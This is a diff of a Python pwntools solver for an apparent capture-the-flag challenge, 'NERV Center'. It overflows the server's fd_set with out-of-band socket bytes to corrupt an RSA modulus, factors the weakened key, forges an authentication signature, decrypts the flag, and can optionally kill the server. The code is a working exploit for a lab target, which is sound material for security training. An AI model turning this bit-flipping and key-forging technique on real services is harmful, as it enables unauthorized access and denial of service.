@@ -6,8 +6,9 @@ import sys
 import resource
 from pwn import *
 from ssh_pubkey import parse_key
-from composite_key import CompositeAttack, rootpath
+from composite_key import CompositeAttack, solverbins
 import subprocess
+import base64
 
 RED = '\033[91m'
 RESET = '\033[0m'
@@ -28,10 +29,24 @@ def compare_keys(n1, n2, name1, name2, keysize=128, limit=-1):
     print()
 
 def sign(n, e, d, m):
-    signing_bin = '%s/signmessage' % rootpath()
+    signing_bin = str(solverbins() / 'signmessage')
     cmd = [signing_bin, str(n), str(e), str(d), str(m)]
-    sig = subprocess.check_output(cmd, text=True)
+    try:
+        sig = subprocess.check_output(cmd, text=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error signing message: {e}")
+        return None
     return sig.strip()
+
+def decrypt(n, e, d, c):
+    decrypt_bin = str(solverbins() / 'decryptmessage')
+    cmd = [decrypt_bin, str(n), str(e), str(d), c.hex()]
+    try:
+        data = subprocess.check_output(cmd)
+    except subprocess.CalledProcessError as e:
+        print(f"Error decrypting message: {e}")
+        return None
+    return data
 
 def find_all(a_str, sub):
     matches = []
@@ -70,9 +85,6 @@ def make_connections(host, port, num_clients):
             break
     return sockets
 
-def oob_corrupt(sockets, i):
-    sockets[i].send(b'1', socket.MSG_OOB)
-
 def get_key(r):
     # Read the menu and ask for the public key
     r.sendline(b'2')
@@ -80,8 +92,12 @@ def get_key(r):
     new_key = r.readline().decode('utf-8').strip()
     r.readuntil(b'Enter your choice: ')
     # Parse the public key
-    _, _, modulus = parse_key(new_key)
-    return modulus
+    _, e, n = parse_key(new_key)
+    # Check for even modulus
+    if (n & 1) == 0:
+        print("WARNING: Modulus is even")
+        print(f"Modulus: {n}")
+    return e, n
 
 def authenticate(r, key):
     # Authenticate
@@ -90,6 +106,9 @@ def authenticate(r, key):
     challenge = chal.decode().strip().split()[-1]
     print(f"Got challenge: {challenge}, signing with forged key")
     forged_sig = sign(key.n, key.e, key.d, challenge)
+    if forged_sig is None:
+        print("Failed to sign with forged key")
+        return False
     print(f"Got forged signature: {forged_sig}")
     r.readuntil(b'Response: ')
     r.sendline(forged_sig.encode())
@@ -119,11 +138,13 @@ def try_factor(n, e):
 
 def pause_client(r):
     # Pause the client
+    print("Pausing client")
     r.sendline(b'3')
     r.readuntil(b'Enter your choice: ')
 
 def resume_client(r):
     # Resume the client
+    print("Resuming client")
     r.sendline(b'4')
     r.readuntil(b'Enter your choice: ')
 
@@ -137,36 +158,56 @@ def predict_bit_pattern(bits, controlled_bits=33):
     num_bytes = ((controlled_bits + 63) // 64) * 8
     return pattern.to_bytes(num_bytes, 'little')
 
-def solve(args):
-    # Connect to the server on the main port
+# NB: only in debug builds
+def get_bit_pattern(r):
+    r.sendline(b'1234')
+    fdbits = r.readline().decode('utf-8').strip()
+    # looks like
+    #   fd_bits = [ 1036 1037 1040 1046 1049 ]
+    fds = fdbits.split()[3:-1]
+    bits = [int(f) - 1024 for f in fds]
+    r.readuntil(b'Enter your choice: ')
+    return set(bits)
+
+# NB: only in debug builds
+def kill_server(args):
     r = remote(args.host, args.port)
-    intro_text = r.readuntil(b'Your public key is:\n')
-    print(intro_text.decode('utf-8'), end='')
-    # Read the public key
-    initial_key = r.readline().decode('utf-8').strip()
-    print(initial_key)
-    # Parse the public key
-    _, exponent, initial_modulus = parse_key(initial_key)
-    print(f"Exponent: {exponent}")
-    print(f"Modulus: {initial_modulus}")
-    # Read the port number
-    port_text = r.readline().decode('utf-8').strip()
-    print(port_text)
-    client_port = int(port_text.split()[-1])
-    # Read the menu
-    menu = r.readuntil(b'Enter your choice: ')
-    print(menu.decode('utf-8'), end='')
-    sockets = make_connections(args.host, client_port, args.num_clients)
-    print(f"\nConnected {len(sockets)} clients")
+    r.recvuntil(b'Enter your choice: ')
+    r.sendline(str(0xdead).encode())
+    r.close()
 
-    # The server uses fds 0-6 internally, assuming one client:
-    #   (stdin, stdout, stderr, control_listen, control_accept, client_listen, client_accept)
-    # and FD_SETSIZE is 1024. So the bits we control are len(sockets) - 1024 + 7
-    controlled_bits = len(sockets) - 1024 + 7
-    print(f"Controlled bits: {controlled_bits}")
-    overflow_sockets = sockets[-controlled_bits:]
+def clear_bit_pattern(csock):
+    print("Clearing bit pattern via client interface")
+    csock.send(b'EMERGENCY\n')
+    resp = csock.recvuntil(b'> ')
+    print(resp.decode())
 
-    found = False
+def parse_flag(resp):
+    flaglines = []
+    in_flag = False
+    for line in resp.splitlines():
+        if line.startswith('-----BEGIN NERV ENCRYPTED MESSAGE-----'):
+            in_flag = True
+            print("[... flag data omitted ...]")
+        elif line.startswith('-----END NERV ENCRYPTED MESSAGE-----'):
+            in_flag = False
+        elif in_flag:
+            flaglines.append(line)
+        else:
+            print(line.rstrip())
+    flagdata_bytes = base64.decodebytes(''.join(flaglines).encode())
+    return flagdata_bytes
+
+def get_flag(r):
+    r.sendline(b'1')
+    resp = r.readuntil(b'Enter your choice: ')
+    resp = resp.decode('utf-8')
+    # Flag is base64 encoded encrypted message, in between
+    # -----BEGIN NERV ENCRYPTED MESSAGE-----
+    # -----END NERV ENCRYPTED MESSAGE-----
+    return parse_flag(resp)
+
+def solve_onebit(r, overflow_sockets, controlled_bits, initial_modulus):
     current_modulus = initial_modulus
     already_tried = set()
     while already_tried != set(range(len(overflow_sockets))):
@@ -175,37 +216,107 @@ def solve(args):
         predicted = predict_bit_pattern(already_tried | {s}, controlled_bits)
         sock = overflow_sockets[s]
         sock.send(b'1', socket.MSG_OOB)
-        time.sleep(0.1)
         already_tried.add(s)
         # Pause the client thread so that it doesn't overwrite the key
-        pause_client(r)
-        modulus = get_key(r)
-        compare_keys(current_modulus, modulus, 'Old', 'New', limit=64)
-        guessed = "CORRECT" if modulus.to_bytes(128, 'big')[:8] == predicted else "WRONG"
-        print(f"Prd: {predicted.hex()} ({guessed})")
-        if modulus == current_modulus:
-            print(f"Key is unchanged; bit {s} must have already been 1")
-            continue
+        with PausedClient(r):
+            e, modulus = get_key(r)
+            compare_keys(current_modulus, modulus, 'Old', 'New', limit=64)
+            guessed = "CORRECT" if modulus.to_bytes(128, 'big')[:8] == predicted else "WRONG"
+            print(f"Prd: {predicted.hex()} ({guessed})")
+            if modulus == current_modulus:
+                print(f"WARNING: Key is unchanged; something went wrong :(")
+                # No point trying to factor the same modulus again
+                continue
         current_modulus = modulus
-        key = try_factor(modulus, exponent)
+        key = try_factor(modulus, e)
         if key:
-            found = True
-            break
-        # Resume the client thread
-        resume_client(r)
-        time.sleep(0.1)
+            return key
+    return None
 
-    if not found:
-        print("Failed to find key :(")
+def solve_randbits(r, csock, overflow_sockets, controlled_bits, initial_modulus, k=3, tries=10):
+    current_modulus = initial_modulus
+    for _ in range(tries):
+        # Clear any previous attempts
+        clear_bit_pattern(csock)
+        # Pick k random bits to set
+        bits_to_set = random.sample(set(range(len(overflow_sockets))), k)
+        print(f"Trying to set bits {bits_to_set}")
+        predicted = predict_bit_pattern(bits_to_set, controlled_bits)
+        for s in bits_to_set:
+            sock = overflow_sockets[s]
+            sock.send(b'1', socket.MSG_OOB)
+        # Pause the client thread so that it doesn't overwrite the key
+        with PausedClient(r):
+            e, modulus = get_key(r)
+            compare_keys(current_modulus, modulus, 'Old', 'New', limit=64)
+            guessed = "CORRECT" if modulus.to_bytes(128, 'big')[:8] == predicted else "WRONG"
+            print(f"Prd: {predicted.hex()} ({guessed})")
+            if modulus == current_modulus:
+                print(f"WARNING: Key is unchanged; something went wrong :(")
+                # No point trying to factor the same modulus again
+                continue
+        current_modulus = modulus
+        key = try_factor(modulus, e)
+        if key:
+            return key
+    return None
+
+# Context wrapper that pauses the client thread
+class PausedClient:
+    def __init__(self, r):
+        self.r = r
+    def __enter__(self):
+        pause_client(self.r)
+    def __exit__(self, type, value, traceback):
+        resume_client(self.r)
+
+def solve(args):
+    # Connect to the server on the main port
+    r = remote(args.host, args.port)
+    port_text = r.recvline_startswith(b'Your very own port is')
+    client_port = int(port_text.decode().split()[-1])
+
+    # Read the menu
+    menu = r.readuntil(b'Enter your choice: ')
+
+    # Get the public key
+    e, initial_modulus = get_key(r)
+
+    # Make one client connection using pwntools
+    csock = remote(args.host, client_port)
+    csock.recvuntil(b'> ')
+
+    sockets = make_connections(args.host, client_port, args.num_clients - 1)
+    print(f"\nConnected {len(sockets)} clients")
+
+    # The server uses fds 0-6 internally, assuming one client:
+    #   (stdin, stdout, stderr, control_listen, control_accept, client_listen, client_accept)
+    # and FD_SETSIZE is 1024. So the bits we control are len(sockets) - 1024 + 7
+    controlled_bits = len(sockets) + 1 - 1024 + 7
+    print(f"Controlled bits: {controlled_bits}")
+    overflow_sockets = sockets[-controlled_bits:]
+
+    key = solve_onebit(r, overflow_sockets, controlled_bits, initial_modulus)
+    if key is None:
+        print("Failed to factor key")
         return
 
+    tries = 1
     while True:
-        success = authenticate(r, key)
-        if success:
-            # TODO: implement once we figure out what should happen
-            # after you successfully authenticate
-            print(f"Successfully authenticated! :)")
-            break
+        with PausedClient(r):
+            success = authenticate(r, key)
+            if success:
+                print(f"Successfully authenticated after {tries} tries! :)")
+                flagdata_bytes = get_flag(r)
+                flag = decrypt(key.n, key.e, key.d, flagdata_bytes)
+                print(f"Retrieved flag, {len(flag)} bytes!")
+                # Save the flag to a file
+                with open(args.output, 'wb') as f:
+                    f.write(flag)
+                print(f"Saved flag to {args.output}")
+                break
+            else:
+                tries += 1
     r.close()
     for s in sockets:
         s.close()
@@ -217,38 +328,35 @@ def check_prereqs():
         print("Please install sage (needed for ECM factoring attack)")
         return False
     # Check for brent and signmessage
-    signing_bin = '%s/signmessage' % rootpath()
-    brent_bin = '%s/brent' % rootpath()
-    if not os.path.exists(signing_bin) or not os.path.exists(brent_bin):
+    signing_bin = solverbins() / 'signmessage'
+    brent_bin = solverbins() / 'brent'
+    if not signing_bin.exists() or not brent_bin.exists():
         print("Missing brent (optimized Pollard's rho) or signmessage (signing binary)")
-        print("Will try to build them now...")
-        try:
-            # Run make in the root directory. Capture stdout/stderr and print it if it fails
-            topdir = os.path.dirname(rootpath())
-            out = subprocess.run(['make', '-C', topdir], check=True,
-                                 stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                                 text=True)
-            print(out.stdout)
-            print("Built binaries successfully")
-            return True
-        except Exception as e:
-            print(f"Failed to build binaries: {e}")
-            return False
+        print(f"Searched: {signing_bin}, {brent_bin}")
+        print("You need to build the solver binaries first, or fix the path")
+        return False
     return True
 
 def main():
-    parser = argparse.ArgumentParser(description='NERV Client')
+    parser = argparse.ArgumentParser(description='NERV Center solver')
     parser.add_argument('host', default='localhost', nargs='?', help='IP or hostname')
     parser.add_argument('-p', '--port', metavar='port', type=int, default=2000,
                         help='TCP port (default 2000)')
     parser.add_argument('-n', '--num_clients', metavar='num_clients', type=int, default=1050,
-                        help='Number of clients (default 32)')
+                        help='Number of clients (default 1050)')
+    parser.add_argument('-o', '--output', metavar='output', type=str, default='flag.txt')
+    parser.add_argument('-k', '--kill', action='store_true', help='Kill the server after solving')
+    parser.add_argument('-m', '--method', metavar='method', choices=['onebit', 'randbits'], type=str, default='onebit')
     args = parser.parse_args()
     if not check_prereqs():
         return
 
+    # Making lots of connections so increase the open files limit
     increase_open_files_limit()
+
     solve(args)
+    if args.kill:
+        kill_server(args)
 
 if __name__ == '__main__':
     main()
